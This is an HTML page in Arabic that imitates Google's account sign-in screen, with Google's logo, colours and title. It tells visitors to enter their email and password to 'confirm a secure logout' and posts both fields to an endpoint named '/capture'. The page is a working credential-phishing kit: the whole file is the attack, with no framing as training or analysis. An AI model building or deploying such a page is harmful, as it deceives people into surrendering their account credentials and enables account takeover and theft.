<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #dadce0; border-radius: 8px; width: 450px; padding: 48px 40px 36px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #202124; font-size: 16px; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; float: left; }
        .footer { margin-top: 50px; font-size: 12px; color: #70757a; display: flex; justify-content: space-between; }
    </style>
</head>
<body>
    <div class="card">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
        <h1>تسجيل الدخول</h1>
        <p>استخدم حسابك على Google لتأكيد عملية الخروج الآمن</p>
        <form action="/capture" method="post">
            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            <div style="text-align: right; margin: 10px 0 30px;">
                <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500;">هل نسيت البريد الإلكتروني؟</a>
            </div>
            <button type="submit" class="btn">التالي</button>
        </form>
    </div>
</body>
</html>
